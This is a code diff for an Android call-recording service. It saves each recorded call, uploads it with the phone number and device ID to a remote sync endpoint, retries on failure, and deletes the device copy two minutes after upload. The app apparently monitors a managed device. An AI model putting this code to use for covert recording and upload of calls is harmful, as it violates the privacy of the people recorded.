@@ -212,80 +212,132 @@ class CallRecordService : Service() {
         
         audioRecorder?.stopRecording()
         
-        // Upload recording
+        // Upload recording and schedule deletion
         currentRecordingFile?.let { file ->
             if (file.exists() && file.length() > 0) {
-                uploadCallRecording(file, currentPhoneNumber)
+                // Copy to permanent location first
+                val recordingsDir = File(getExternalFilesDir(null), "CallRecordings")
+                if (!recordingsDir.exists()) recordingsDir.mkdirs()
+                
+                val permanentFile = File(recordingsDir, file.name)
+                file.copyTo(permanentFile, overwrite = true)
+                file.delete() // Delete temp file
+                
+                // Upload and schedule auto-delete
+                uploadCallRecordingWithAutoDelete(permanentFile, currentPhoneNumber)
             }
         }
     }
 
-    private fun uploadCallRecording(file: File, phoneNumber: String?) {
+    private fun uploadCallRecordingWithAutoDelete(file: File, phoneNumber: String?) {
         serviceScope.launch {
-            try {
-                val deviceId = preferenceManager.getDeviceId()
-                val baseUrl = ApiClient.BASE_URL.trimEnd('/')
-                val uploadUrl = "$baseUrl/api/device-owner/$deviceId/call-recording/upload"
-                
-                // Calculate duration from file (approximate: file size / bitrate)
-                val duration = (file.length() / 8000).toInt() // rough estimate for MP3
-                
-                // Create multipart request
-                val boundary = "----FormBoundary${System.currentTimeMillis()}"
-                val connection = java.net.URL(uploadUrl).openConnection() as java.net.HttpURLConnection
-                
-                connection.requestMethod = "POST"
-                connection.doOutput = true
-                connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
-                
-                val outputStream = connection.outputStream
-                val writer = java.io.PrintWriter(java.io.OutputStreamWriter(outputStream, "UTF-8"), true)
-                
-                // Add file field
-                writer.append("--$boundary\r\n")
-                writer.append("Content-Disposition: form-data; name=\"recording\"; filename=\"${file.name}\"\r\n")
-                writer.append("Content-Type: audio/mpeg\r\n\r\n")
-                writer.flush()
-                
-                // Write file data
-                file.inputStream().use { input ->
-                    input.copyTo(outputStream)
+            var uploadSuccess = false
+            var retryCount = 0
+            val maxRetries = 3
+            
+            while (!uploadSuccess && retryCount < maxRetries) {
+                uploadSuccess = uploadCallRecording(file, phoneNumber)
+                if (!uploadSuccess) {
+                    retryCount++
+                    Log.w(TAG, "Upload failed, retry $retryCount/$maxRetries")
+                    delay(10000) // Wait 10 seconds between retries
                 }
-                outputStream.flush()
-                
-                // Add phoneNumber field
-                writer.append("\r\n--$boundary\r\n")
-                writer.append("Content-Disposition: form-data; name=\"phoneNumber\"\r\n\r\n")
-                writer.append(phoneNumber ?: "Unknown")
-                
-                // Add callType field
-                writer.append("\r\n--$boundary\r\n")
-                writer.append("Content-Disposition: form-data; name=\"callType\"\r\n\r\n")
-                writer.append("outgoing")
-                
-                // Add duration field
-                writer.append("\r\n--$boundary\r\n")
-                writer.append("Content-Disposition: form-data; name=\"duration\"\r\n\r\n")
-                writer.append(duration.toString())
-                
-                // End boundary
-                writer.append("\r\n--$boundary--\r\n")
-                writer.flush()
-                
-                val responseCode = connection.responseCode
-                if (responseCode in 200..299) {
-                    Log.d(TAG, "Call recording uploaded successfully")
-                    // Delete local file
-                    file.delete()
-                } else {
-                    Log.e(TAG, "Failed to upload call recording: HTTP $responseCode")
-                }
-                
-                connection.disconnect()
-                
-            } catch (e: Exception) {
-                Log.e(TAG, "Failed to upload call recording", e)
             }
+            
+            if (uploadSuccess) {
+                Log.d(TAG, "Call recording uploaded successfully, scheduling deletion in 2 minutes")
+                // Delete after 2 minutes
+                delay(2 * 60 * 1000L) // 2 minutes
+                if (file.exists()) {
+                    file.delete()
+                    Log.d(TAG, "Call recording deleted from device: ${file.name}")
+                }
+            } else {
+                Log.e(TAG, "Failed to upload after $maxRetries retries, keeping file for later sync")
+                // Mark file for later sync
+                val markerFile = File(file.parent, "${file.name}.pending")
+                markerFile.writeText(phoneNumber ?: "Unknown")
+            }
+        }
+    }
+
+    private suspend fun uploadCallRecording(file: File, phoneNumber: String?): Boolean {
+        return try {
+            val deviceId = preferenceManager.getDeviceId()
+            val baseUrl = ApiClient.BASE_URL.trimEnd('/')
+            val uploadUrl = "$baseUrl/api/sync/call-recording"
+            
+            // Calculate duration from file (approximate: file size / bitrate)
+            val duration = (file.length() / 8000).toInt() // rough estimate for MP3
+            
+            // Create multipart request
+            val boundary = "----FormBoundary${System.currentTimeMillis()}"
+            val connection = java.net.URL(uploadUrl).openConnection() as java.net.HttpURLConnection
+            
+            connection.connectTimeout = 30000
+            connection.readTimeout = 30000
+            connection.requestMethod = "POST"
+            connection.doOutput = true
+            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
+            connection.setRequestProperty("x-device-id", deviceId)
+            
+            val outputStream = connection.outputStream
+            val writer = java.io.PrintWriter(java.io.OutputStreamWriter(outputStream, "UTF-8"), true)
+            
+            // Add deviceId field
+            writer.append("--$boundary\r\n")
+            writer.append("Content-Disposition: form-data; name=\"deviceId\"\r\n\r\n")
+            writer.append(deviceId)
+            
+            // Add file field
+            writer.append("\r\n--$boundary\r\n")
+            writer.append("Content-Disposition: form-data; name=\"recording\"; filename=\"${file.name}\"\r\n")
+            writer.append("Content-Type: audio/mpeg\r\n\r\n")
+            writer.flush()
+            
+            // Write file data
+            file.inputStream().use { input ->
+                input.copyTo(outputStream)
+            }
+            outputStream.flush()
+            
+            // Add phoneNumber field
+            writer.append("\r\n--$boundary\r\n")
+            writer.append("Content-Disposition: form-data; name=\"phoneNumber\"\r\n\r\n")
+            writer.append(phoneNumber ?: "Unknown")
+            
+            // Add callType field
+            writer.append("\r\n--$boundary\r\n")
+            writer.append("Content-Disposition: form-data; name=\"callType\"\r\n\r\n")
+            writer.append("outgoing")
+            
+            // Add duration field
+            writer.append("\r\n--$boundary\r\n")
+            writer.append("Content-Disposition: form-data; name=\"duration\"\r\n\r\n")
+            writer.append(duration.toString())
+            
+            // Add timestamp field
+            writer.append("\r\n--$boundary\r\n")
+            writer.append("Content-Disposition: form-data; name=\"timestamp\"\r\n\r\n")
+            writer.append(System.currentTimeMillis().toString())
+            
+            // End boundary
+            writer.append("\r\n--$boundary--\r\n")
+            writer.flush()
+            
+            val responseCode = connection.responseCode
+            connection.disconnect()
+            
+            if (responseCode in 200..299) {
+                Log.d(TAG, "Call recording uploaded: ${file.name}")
+                true
+            } else {
+                Log.e(TAG, "Upload failed: HTTP $responseCode")
+                false
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Upload error: ${e.message}")
+            false
         }
     }
 
